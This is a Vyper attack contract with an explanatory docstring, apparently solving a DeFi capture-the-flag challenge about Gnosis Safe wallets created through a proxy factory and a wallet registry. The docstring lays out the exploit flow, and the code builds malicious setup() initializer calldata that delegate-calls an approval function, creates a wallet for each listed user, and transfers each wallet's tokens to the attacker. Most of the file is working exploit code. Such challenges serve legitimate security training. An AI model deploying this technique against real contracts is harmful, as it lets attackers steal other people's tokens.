# @version ^0.3.7

"""
The vulnerability is in a few things, but I would say the main 
vulnerability that makes this challenge exploitable is that anyone is able
to create a wallet on behalf of a beneficiary. At no point in the process 
of creating a wallet is the msg.sender confirmed to in fact be one of the owners.
That vulnerability then allows an attacker to provider an address and data to 
the GnosisSafe `setup()` function for an optional delegate call from the deployed wallet:
see `to` param and `data` param in `setup()` function. The attacker can supply a contract 
address and calldata for a function call that will make the caller (the wallet) 
approve any address to handle all of its tokens. The attacker can then send those 
tokens from the wallet to wherever they wish. Previous solutions supplied a contract address 
for the `fallbackhandler` param in the `setup()` function, but V3 of this challenge includes a 
check to ensure that there was no fallbackhandler assigned. 
The exploit flow is: for each user call `createProxyWithCallBack()` with the malicious initializer
calldata => proxy/wallet is created and `setup()` function is called & `wallet_registry.proxyCreated()` 
is called by factory contract (all conditions will pass). When the `setup()` function is called after the 
creation of the proxy/wallet contract, the proxy/wallet delegate calls into our supplied contract and calls 
the function we supplied in the calldata (delegate_approve(address,address)). This means the proxy/wallet 
will call this function in their own context, hence they will approve us to handle all their tokens. 
In order to complete this challenge in one transaction we have to deploy a helper contract 
(implementing the delegate_approve()) within our attacker contract. It is easy to do so with solidity, but vyper
only allows you to create new contracts from within contracts by copying the code at already deployed contract 
addresses. Therefore I deployed the helper contract address via a different address and used vyper's contract 
creation method: `create_copy_of()` to complete the attack in on deployment transaction. If you use solidity you 
will be able to implement this attack without first deploying the helper contract since you can us the `new` keyword
to easily deploy a contract from within another contract.
"""

from vyper.interfaces import ERC20 as IERC20

interface IProxyFactory:
    def createProxyWithCallback(
        singleton: address,
        initializer: Bytes[548],
        saltNonce: uint256,
        IProxyCreationCallback: address,
    ) -> address: nonpayable

@external
@payable
def __init__(
    target: address,
    proxy_factory: address,
    singleton: address,
    callback: address,
    token: address,
    users: DynArray[address, 4],
):
    accomplice: address = create_copy_of(target)
    for _user in users:
        user: DynArray[address, 1] = [_user]
        data: Bytes[548] = _abi_encode(
            user,
            convert(1, uint256),
            accomplice,
            _abi_encode(
                self,
                token,
                method_id=method_id("delegate_approve(address,address)")
            ),
            empty(address),
            empty(address),
            empty(uint256),
            empty(address),
            method_id=method_id("setup(address[],uint256,address,bytes,address,address,uint256,address)"),
        )
        proxy: address = IProxyFactory(
            proxy_factory,
        ).createProxyWithCallback(
            singleton,
            data,
            empty(uint256),
            callback,
        )
        IERC20(token).transferFrom(proxy, msg.sender, as_wei_value(10, "ether"))
